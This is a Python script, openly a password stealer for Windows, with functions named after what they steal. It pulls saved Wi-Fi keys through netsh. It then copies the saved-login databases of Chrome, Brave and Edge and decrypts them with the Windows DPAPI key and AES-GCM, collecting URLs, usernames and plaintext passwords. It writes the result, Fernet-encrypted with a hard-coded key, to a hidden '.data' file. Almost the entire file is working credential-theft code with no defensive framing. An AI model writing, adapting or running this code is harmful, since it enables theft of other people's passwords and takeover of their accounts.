import subprocess
import os
import json
from base64 import b64decode
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
from Crypto.PublicKey import RSA
import shutil
from datetime import datetime, timedelta
import sys
import rsa
from cryptography.fernet import Fernet

RESULT=""

key=b'9RmTuhsWSz7hcy_uxz72ci6hVCKQ5tc_Y18qJXIY3sE='
fernet = Fernet(key)
Enable_Encryption="YES"
def spacer():
    return (("########################################################")+'\n')

def loadKeys(public):
    public=b64decode(public)
    pub=RSA.importKey(public)
    return pub

sys.stdout = open('.data', 'w')

def ender():
    global RESULT
    RESULT+=("@@@@@@@@@@@@ END OF CONTENT @@@@@@@@@@@@")+'\n'
    RESULT+=("@@@@@@@@@@@@ END OF CONTENT @@@@@@@@@@@@")+'\n'
    RESULT+=("@@@@@@@@@@@@ END OF CONTENT @@@@@@@@@@@@")+'\n'


def encrypt(message):
    if(Enable_Encryption != "YES"):
        spacer()
        print("Printing in plane text format as RSA public key not provided,,,, please refer to README")
        spacer()
        return message
    return fernet.encrypt(message.encode())


def wifi_pass_stealler():
    global RESULT
    data = subprocess.check_output(
        ['netsh', 'wlan', 'show', 'profiles'], shell=True, stderr=sys.stdout).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    result = ""
    for i in profiles:
        password = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i,
                                            'key=clear'], shell=True).decode('utf-8').split('\n')
        password = [b.split(":")[1][1:-1]
                    for b in password if "Key Content" in b]
        try:
            result += (("{:<30}|  {:<}".format(i, password[0])))+'\n'
        except IndexError:
            result += (("{:<30}|  {:<}".format(i, "")))+'\n'
    RESULT+=result
    ender()


def chrome_pass_stealler():
    global RESULT
    result=""
    def chrome_date_and_time(chrome_data):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

    def fetching_encryption_key():
        local_computer_directory_path = os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
            "User Data", "Local State")
        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)

        encryption_key = base64.b64decode(
            local_state_data["os_crypt"]["encrypted_key"])

        encryption_key = encryption_key[5:]

        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

    def password_decryption(password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]

            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()
        except:

            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"

    key = fetching_encryption_key()
    db_path = os.path.join("powershell",os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome","User` Data")
    users=os.popen('powershell ls '+db_path).read()
    cnt=0
    for i in range(1,10):
        if(users.count("Profile "+str(i))):
            cnt+=1
        else:
            break

    for userid in range (0,cnt+1):
        try:
            profile="Profile "+str(userid)
            result+=spacer()
            result+=profile+'\n'
            result+=spacer()
            if(userid==0):
                profile="Default"
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                   "Google", "Chrome", "User Data", profile, "Login Data")
            filename = "ChromePasswords.db"
            shutil.copyfile(db_path, filename)

            db = sqlite3.connect(filename)
            cursor = db.cursor()

            cursor.execute(
                "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
                "order by date_last_used")

            for row in cursor.fetchall():
                main_url = row[0]
                login_page_url = row[1]
                user_name = row[2]
                decrypted_password = password_decryption(row[3], key)
                date_of_creation = row[4]
                last_usuage = row[5]

                if user_name or decrypted_password:
                    result+=(f"Main URL: {main_url}")+'\n'
                    result+=(f"Login URL: {login_page_url}")+'\n'
                    result+=(f"User name: {user_name}")+'\n'
                    result+=(f"Decrypted Password: {decrypted_password}")+'\n'

                else:
                    continue

                if date_of_creation != 86400000000 and date_of_creation:
                    result+=(
                        f"Creation date: {str(chrome_date_and_time(date_of_creation))}")+'\n'

                if last_usuage != 86400000000 and last_usuage:
                    result+=(f"Last Used: {str(chrome_date_and_time(last_usuage))}")+'\n'
                result+=("=" * 100)+'\n'
            cursor.close()
            db.close()

            try:
                os.remove(filename)
            except:
                pass
        except:
            continue
    RESULT+=result
    ender()

def brave_pass_stealler():
    global RESULT
    result=""
    def chrome_date_and_time(chrome_data):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

    def fetching_encryption_key():
        local_computer_directory_path = os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware","Brave-Browser",
            "User Data", "Local State")
        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)

        encryption_key = base64.b64decode(
            local_state_data["os_crypt"]["encrypted_key"])

        encryption_key = encryption_key[5:]

        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

    def password_decryption(password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]

            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()
        except:

            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"

    key = fetching_encryption_key()
    db_path = os.path.join("powershell",os.environ["USERPROFILE"], "AppData", "Local",
                           "BraveSoftware","Brave-Browser","User` Data")
    users=os.popen('powershell ls '+db_path).read()
    cnt=0
    for i in range(1,10):
        if(users.count("Profile "+str(i))):
            cnt+=1
        else:
            break

    for userid in range (0,cnt+1):
        try:
            profile="Profile "+str(userid)
            result+=spacer()
            result+=profile+'\n'
            result+=spacer()
            if(userid==0):
                profile="Default"
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                   "BraveSoftware","Brave-Browser", "User Data", profile, "Login Data")
            filename = "BravePasswords.db"
            shutil.copyfile(db_path, filename)

            db = sqlite3.connect(filename)
            cursor = db.cursor()

            cursor.execute(
                "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
                "order by date_last_used")

            for row in cursor.fetchall():
                main_url = row[0]
                login_page_url = row[1]
                user_name = row[2]
                decrypted_password = password_decryption(row[3], key)
                date_of_creation = row[4]
                last_usuage = row[5]

                if user_name or decrypted_password:
                    result+=(f"Main URL: {main_url}")+'\n'
                    result+=(f"Login URL: {login_page_url}")+'\n'
                    result+=(f"User name: {user_name}")+'\n'
                    result+=(f"Decrypted Password: {decrypted_password}")+'\n'

                else:
                    continue

                if date_of_creation != 86400000000 and date_of_creation:
                    result+=(
                        f"Creation date: {str(chrome_date_and_time(date_of_creation))}")+'\n'

                if last_usuage != 86400000000 and last_usuage:
                    result+=(f"Last Used: {str(chrome_date_and_time(last_usuage))}")+'\n'
                result+=("=" * 100)+'\n'
            cursor.close()
            db.close()

            try:
                os.remove(filename)
            except:
                pass
        except:
            continue
    RESULT+=result
    ender()   

def edge_pass_stealler():
    global RESULT
    result=""
    def chrome_date_and_time(chrome_data):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

    def fetching_encryption_key():
        local_computer_directory_path = os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge",
            "User Data", "Local State")
        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)

        encryption_key = base64.b64decode(
            local_state_data["os_crypt"]["encrypted_key"])

        encryption_key = encryption_key[5:]

        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

    def password_decryption(password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]

            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()
        except:

            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"

    key = fetching_encryption_key()
    db_path = os.path.join("powershell",os.environ["USERPROFILE"], "AppData", "Local",
                           "Microsoft", "Edge","User` Data")
    users=os.popen('powershell ls '+db_path).read()
    cnt=0
    for i in range(1,10):
        if(users.count("Profile "+str(i))):
            cnt+=1
        else:
            break

    for userid in range (0,cnt+1):
        try:
            profile="Profile "+str(userid)
            result+=spacer()
            result+=profile+'\n'
            result+=spacer()
            if(userid==0):
                profile="Default"
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                   "Microsoft", "Edge", "User Data", profile, "Login Data")
            filename = "EdgePasswords.db"
            shutil.copyfile(db_path, filename)

            db = sqlite3.connect(filename)
            cursor = db.cursor()

            cursor.execute(
                "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
                "order by date_last_used")

            for row in cursor.fetchall():
                main_url = row[0]
                login_page_url = row[1]
                user_name = row[2]
                decrypted_password = password_decryption(row[3], key)
                date_of_creation = row[4]
                last_usuage = row[5]

                if user_name or decrypted_password:
                    result+=(f"Main URL: {main_url}")+'\n'
                    result+=(f"Login URL: {login_page_url}")+'\n'
                    result+=(f"User name: {user_name}")+'\n'
                    result+=(f"Decrypted Password: {decrypted_password}")+'\n'

                else:
                    continue

                if date_of_creation != 86400000000 and date_of_creation:
                    result+=(
                        f"Creation date: {str(chrome_date_and_time(date_of_creation))}")+'\n'

                if last_usuage != 86400000000 and last_usuage:
                    result+=(f"Last Used: {str(chrome_date_and_time(last_usuage))}")+'\n'
                result+=("=" * 100)+'\n'
            cursor.close()
            db.close()

            try:
                os.remove(filename)
            except:
                pass
        except:
            continue
    RESULT+=result
    ender()

ender()
if __name__ == "__main__":
    wifi_pass_stealler()
    chrome_pass_stealler()
    brave_pass_stealler()
    edge_pass_stealler()
print(encrypt(RESULT)) 
